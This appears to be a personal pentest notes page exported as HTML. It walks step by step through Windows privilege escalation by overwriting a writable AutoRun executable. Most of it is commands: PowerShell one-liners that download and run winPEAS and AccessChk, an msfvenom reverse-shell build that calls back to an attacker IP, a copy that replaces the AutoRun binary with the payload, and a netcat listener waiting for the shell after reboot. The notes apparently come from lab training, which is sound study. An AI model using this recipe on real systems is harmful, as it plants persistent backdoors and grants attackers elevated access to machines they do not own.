<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>AutoRuns</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>AutoRuns</h1><br/><br /><br /><br />• Windows can be configured to run commands at startup, with elevated privileges. These “AutoRuns” are configured in the Registry<br />• These AutoRuns are also a <a href="hodology--System_Security_(Windows_&_Linux)--Malware--Classification--Trojan_Horse--ncat--reverse_backdoor--persistent_backdoor--manually.html">type of malware(persistent backdoor)</a><br /><br /><strong>What we need to escalate privileges:</strong><br />   ◇ able to write to an AutoRun executable<br />   ◇ we are able to restart the system (or wait for it to be restarted)<br /> <br /><br /><br />0. WinPEAS generally check for service misconfigurations:  <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe</a><br />      <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe&quot;</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe quiet applicationsinfo&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe&quot;</span>;</pre></div><br />    <a href=""><img src="images/1328-1.png" alt="images/1328-1.png" /></a><br /><br />1. enumerate the AutoRun executables:<br />   ◇ <strong>reg query</strong>, check manually:<br />       <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; reg query HKLM<span style="color:#ff9d00;font-weight:700">\</span>SOFTWARE<span style="color:#ff9d00;font-weight:700">\</span>Microsoft<span style="color:#ff9d00;font-weight:700">\</span>Windows<span style="color:#ff9d00;font-weight:700">\</span>CurrentVersion<span style="color:#ff9d00;font-weight:700">\</span>Run</pre></div><br />       <a href=""><img src="images/1328-2.png" alt="images/1328-2.png" /></a><br />   ◇  <strong>WinPEAS</strong>, check with tool:  <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe</a><br />      <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe&quot;</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe quiet applicationsinfo&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe&quot;</span>;</pre></div><br />      <a href=""><img src="images/1328-3.png" alt="images/1328-3.png" /></a><br />      <a href=""><img src="images/1328-4.png" alt="images/1328-4.png" /></a><br />2. Verify permissions of the executables:<br />    When we have a list of AutoRun program, for each one we need to verify its permissions on the executables<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>);<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>;<span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\&quot;</span>;[<span style="color:#7f0044;font-weight:400">void</span>] (<span style="color:#ff9d00;font-weight:700">New-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">-</span>ItemType Directory <span style="color:#ff9d00;font-weight:700">-</span>Force);<span style="color:#0088ff;font-weight:400">$Shell</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">new-object</span> <span style="color:#ff9d00;font-weight:700">-</span>com Shell.Application;<span style="color:#0088ff;font-weight:400">$Shell</span>.Namespace(<span style="color:#0088ff;font-weight:400">$DestinationFolder</span>).copyhere(<span style="color:#0088ff;font-weight:400">$Shell</span>.NameSpace(<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span>).Items(),<span style="color:#333333;font-weight:400">4</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\accesschk.exe /accepteula -wvu &quot;</span>C<span style="color:#ff9d00;font-weight:700">:\</span>Program Files<span style="color:#ff9d00;font-weight:700">\</span>Autorun Program<span style="color:#ff9d00;font-weight:700">\</span>program.exe<span style="color:#3ad900;font-weight:400">&quot;&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.exe&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Eula.txt&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>;</pre></div><br />    <a href=""><img src="images/1328-5.png" alt="images/1328-5.png" /></a><br />    How we can see in this case the “C:\Program Files\Autorun Program\program.exe” AutoRun executable is writable by Everyone<br /><br />3. Create a backup of the original executables:<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">copy</span> <span style="color:#3ad900;font-weight:400">&quot;C:\Program Files\Autorun Program\program.exe&quot;</span> C<span style="color:#ff9d00;font-weight:700">:\</span>Temp</pre></div><br />4. Create a reverse shell executable with msfvenom<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># msfvenom -p windows<span style="color:#ff9d00;font-weight:700">/</span>x64<span style="color:#ff9d00;font-weight:700">/</span>shell_reverse_tcp LHOST=192.168.147.139 LPORT=53 -f exe -o reverse.exe</pre></div><br />    <a href=""><img src="images/1328-6.png" alt="images/1328-6.png" /></a><br />5. Copy our reverse shell executable to overwrite the AutoRun executable:<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">copy</span> <span style="color:#ff9d00;font-weight:700">/</span>Y C<span style="color:#ff9d00;font-weight:700">:\</span>PrivEsc<span style="color:#ff9d00;font-weight:700">\</span>reverse.exe <span style="color:#3ad900;font-weight:400">&quot;C:\Program Files\Autorun Program\program.exe&quot;</span></pre></div><br />    <a href=""><img src="images/1328-7.png" alt="images/1328-7.png" /></a><br /><br />6. Start a listener on Kali<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># nc -nvlp 53</pre></div><br /><br />7. restart the target Windows machine to trigger the exploit. <br />    Note on Windows 10: when the system restarts it seems to run the AutoRun commands with the privileges of the last logged on user.<br />    In our TEST scenario we can avoid the issue by log out from the “user” account and log in as the “admin” account first.<br />    </div>
</body>
</html>
